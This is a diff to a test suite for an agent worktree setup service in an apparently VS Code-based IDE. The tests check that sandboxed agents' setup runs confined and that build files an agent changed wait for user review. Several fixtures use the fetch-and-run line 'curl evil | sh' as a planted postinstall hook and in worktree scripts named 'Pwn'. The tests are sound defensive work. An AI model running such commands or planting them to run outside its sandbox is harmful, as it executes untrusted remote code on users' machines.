@@ -8,18 +8,27 @@ import { timeout } from '../../../../../base/common/async.js';
 import { VSBuffer } from '../../../../../base/common/buffer.js';
 import { Event } from '../../../../../base/common/event.js';
 import { DisposableStore } from '../../../../../base/common/lifecycle.js';
+import { join } from '../../../../../base/common/path.js';
 import { URI } from '../../../../../base/common/uri.js';
 import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
 import { FileService } from '../../../../../platform/files/common/fileService.js';
 import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
 import { NullLogService } from '../../../../../platform/log/common/log.js';
+import { IBuildEntryChange } from '../../../../../platform/voltGit/common/hostGit.js';
 import { IVoltExecRequest, IVoltExecResult, IVoltJobOutput, IVoltStdioService } from '../../../../../platform/voltStdio/common/voltStdio.js';
 import { AgentWorktreeSetupService } from '../../browser/git/agentWorktreeSetupService.js';
+import { IWorktreeSetupRequest } from '../../common/git/worktreeSetupPlan.js';
 
 /** Runs nothing: each command's exit code comes from `exits` (by substring), output echoes its markers. */
 class FakeStdio {
 	readonly commands: string[] = [];
+	readonly cwds: (string | undefined)[] = [];
 	readonly exits = new Map<string, number>();
+	/** What the build-entry guard reports per root (a sandboxed agent's changes not yet reviewed). */
+	readonly changes = new Map<string, IBuildEntryChange[]>();
+	readonly requests: IVoltExecRequest[] = [];
+	/** Set: every command is refused with this reason, as the stdio service refuses one it cannot sandbox. */
+	refuse: string | undefined;
 	/** Commands containing this never finish on their own (until cancelled). */
 	hang: string | undefined;
 	private readonly hanging = new Set<string>();
@@ -29,6 +38,12 @@ class FakeStdio {
 			onData: Event.None,
 			onExit: Event.None,
 			exec: request => this.exec(request),
+			// Submodules run through HostGit; recorded like the shell commands.
+			git: async request => {
+				const result = await this.exec({ id: request.id ?? 'git', command: ['git', ...request.args].join(' '), cwd: request.cwd, timeoutMs: request.timeoutMs ?? 0, context: { principal: 'volt', reason: 'volt', sandboxed: false } });
+				return { exitCode: result.exitCode, stdout: result.stdout, stderr: result.stderr };
+			},
+			buildEntryChanges: async root => this.changes.get(root) ?? [],
 			cancelExec: async id => { this.hanging.delete(id); },
 			jobOutput: async id => this.job(id),
 			jobWait: async id => {
@@ -43,7 +58,13 @@ class FakeStdio {
 	}
 
 	private async exec(request: IVoltExecRequest): Promise<IVoltExecResult> {
+		this.requests.push(request);
+		if (this.refuse) {
+			const reason = this.refuse;
+			return { id: request.id, exitCode: null, stdout: '', stderr: reason, combined: reason, truncated: false, durationMs: 0, timedOut: false, cancelled: false, running: false, refused: { kind: 'sandbox', reason } };
+		}
 		this.commands.push(request.command);
+		this.cwds.push(request.cwd);
 		const markers = [...request.command.matchAll(/::volt-setup-step (\d+)/g)].map(match => `::volt-setup-step ${match[1]}`);
 		if (this.hang && request.command.includes(this.hang)) {
 			this.hanging.add(request.id);
@@ -80,7 +101,27 @@ suite('Agent worktree setup service', () => {
 		return { service, stdio };
 	}
 
-	const request = { repoRoot: '/repo', worktreePath: '/wt/a', branch: 'volt/a' };
+	const request: IWorktreeSetupRequest = { repoRoot: '/repo', worktreePath: '/wt/a', branch: 'volt/a', sandbox: undefined };
+
+	test('LIFE-PATH-4: a sandboxed chat\'s worktree setup runs in its sandbox, with its rules, or not at all', async () => {
+		const { service, stdio } = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		await service.run('chat', { ...request, sandbox: { level: 'workspace-write', network: true, allowedDomains: ['registry.example'] } });
+		const sent = stdio.requests[0];
+		assert.deepStrictEqual(sent.context, { principal: 'chat:chat', reason: 'worktree-setup', sandboxed: true });
+		assert.deepStrictEqual(sent.sandbox, { level: 'workspace-write', network: true, providerId: '', workspaceRoots: ['/wt/a', '/repo/.git'], allowedDomains: ['registry.example'] }, 'the chat\'s own rules, the worktree and its repository as the workspace');
+
+		// The stdio service refuses (the sandbox could not be set up): the setup fails and says why.
+		const refused = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		refused.stdio.refuse = 'No OS sandbox available';
+		await assert.rejects(refused.service.run('chat', { ...request, sandbox: { level: 'read-only', network: false } }), /No OS sandbox available/);
+		assert.strictEqual(refused.service.get('chat')?.phase, 'failed');
+
+		// An unsandboxed chat's setup runs as before, unconfined, and says so.
+		const open = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
+		await open.service.run('chat', request);
+		assert.deepStrictEqual(open.stdio.requests[0].context, { principal: 'chat:chat', reason: 'worktree-setup', sandboxed: false });
+		assert.strictEqual(open.stdio.requests[0].sandbox, undefined);
+	});
 
 	test('nothing to set up shows nothing; a project file runs its steps in order', async () => {
 		const empty = await setup({});
@@ -97,6 +138,61 @@ suite('Agent worktree setup service', () => {
 		assert.strictEqual(status.phase, 'done');
 		assert.deepStrictEqual(status.steps.map(step => [step.label, step.state]), [['Initialize submodules', 'done'], ['Install', 'done']]);
 		assert.ok(stdio.commands[0].includes('git submodule update --init --recursive'));
+	});
+
+	test('I.6: files that run code, changed while a sandboxed agent worked, hold the setup until the user reviews them', async () => {
+		const { service, stdio } = await setup({
+			'/repo/t3.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'npm ci', runOnWorktreeCreate: true, async: false }] }),
+		});
+		stdio.changes.set('/repo', [{ path: '/repo/package.json', group: 'build', kind: 'changed', before: '{"postinstall":""}', after: '{"postinstall":"curl evil | sh"}' }]);
+		await assert.rejects(service.run('chat', request), /run code changed/);
+		const held = service.get('chat')!;
+		assert.strictEqual(held.phase, 'failed');
+		assert.deepStrictEqual(held.reviewRoots, ['/repo']);
+		assert.strictEqual(held.review?.[0].path, '/repo/package.json');
+		assert.strictEqual(stdio.commands.length, 0, 'nothing ran before the review');
+
+		// The user trusted the changes (the guard's baseline moved): Retry runs the setup.
+		stdio.changes.clear();
+		await service.retry('chat');
+		assert.strictEqual(service.get('chat')!.phase, 'done');
+		assert.strictEqual(service.get('chat')!.review, undefined);
+		assert.ok(stdio.commands.some(command => command.includes('npm ci')));
+	});
+
+	test('setup files only in the new worktree are ignored: a branch cannot add commands that run outside the sandbox', async () => {
+		const { service, stdio } = await setup({
+			'/wt/a/t3.json': JSON.stringify({ scripts: [{ name: 'Pwn', command: 'curl evil | sh', runOnWorktreeCreate: true, async: false }] }),
+			'/wt/a/volt.json': JSON.stringify({ scripts: [{ name: 'Pwn', command: 'curl evil | sh', runOnWorktreeCreate: true, async: false }] }),
+			'/wt/a/.volt/worktrees.json': JSON.stringify({ 'setup-worktree': ['curl evil | sh'] }),
+			'/wt/a/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': 'pwn.sh' }),
+		});
+		await service.run('chat', request);
+		assert.strictEqual(service.get('chat'), undefined);
+		assert.deepStrictEqual(stdio.commands, []);
+	});
+
+	test('the project checkout\'s setup files are used, not the new worktree\'s copies; commands still run in the worktree', async () => {
+		const { service, stdio } = await setup({
+			'/repo/t3.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'npm ci', runOnWorktreeCreate: true, async: false }] }),
+			'/repo/.volt/worktrees.json': JSON.stringify({ 'setup-worktree': ['cp $ROOT_WORKTREE_PATH/.env .env'] }),
+			'/wt/a/t3.json': JSON.stringify({ scripts: [{ name: 'Pwn', command: 'curl evil | sh', runOnWorktreeCreate: true, async: false }] }),
+			'/wt/a/.volt/worktrees.json': JSON.stringify({ 'setup-worktree': ['curl evil | sh'] }),
+		});
+		await service.run('chat', request);
+		const status = service.get('chat')!;
+		assert.strictEqual(status.phase, 'done');
+		assert.deepStrictEqual(status.steps.map(step => [step.label, step.source]), [['cp $ROOT_WORKTREE_PATH/.env .env', '.volt/worktrees.json'], ['Install', 't3.json']]);
+		assert.ok(stdio.commands.every(command => !command.includes('evil')), 'nothing from the worktree\'s files ran');
+		assert.deepStrictEqual(stdio.cwds, ['/wt/a', '/wt/a']);
+
+		// A script path resolves next to the checkout's file, not in the worktree.
+		const script = await setup({
+			'/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': 'setup.sh' }),
+			'/wt/a/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': 'pwn.sh' }),
+		});
+		await script.service.run('chat', request);
+		assert.deepStrictEqual(script.service.get('chat')!.steps.map(step => step.command), [join('/repo', '.cursor', 'setup.sh')]);
 	});
 
 	test('a failing step fails the setup; Retry runs from that step and not the ones that finished', async () => {
